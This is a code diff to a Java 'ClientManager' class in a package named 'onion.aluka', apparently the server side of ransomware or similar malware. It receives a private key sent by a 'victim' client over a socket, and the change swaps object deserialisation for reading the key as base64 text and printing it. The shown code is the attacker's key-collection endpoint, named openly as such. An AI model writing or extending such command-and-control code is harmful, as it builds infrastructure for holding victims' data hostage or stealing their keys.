@@ -1,5 +1,6 @@
 package onion.aluka;
 
+import java.io.BufferedInputStream;
 import java.io.DataInputStream;
 import java.io.IOException;
 import java.io.ObjectInputStream;
@@ -22,17 +23,16 @@ public class ClientManager implements Runnable {
 
 	@Override
 	public void run() {
-		try {
+		try(BufferedInputStream bis = new BufferedInputStream(this.socket.getInputStream())) {
 			System.out.println("[ + ] - Reading key from this client");
-			ObjectInputStream privateKeyFromVictim = new ObjectInputStream(socket.getInputStream());
-			PrivateKey privateVictimKey = (PrivateKey)privateKeyFromVictim.readObject();
-			System.out.println("[ + ] - Waiting Downlaod");
-			DataInputStream dis = new DataInputStream(this.socket.getInputStream());
-			String request = dis.readUTF();
-			
-			System.out.println(privateVictimKey);
-		} catch (IOException | ClassNotFoundException e) {
-			// TODO Auto-generated catch block
+			int l;
+			byte[] bytes = new byte[1024];
+			String keyBase64 = "";
+			while((l=bis.read(bytes)) > 0) {
+				keyBase64 += new String(bytes,0,l);
+			}
+			System.out.println(keyBase64);
+		} catch (IOException e) {
 			e.printStackTrace();
 		}
 	}
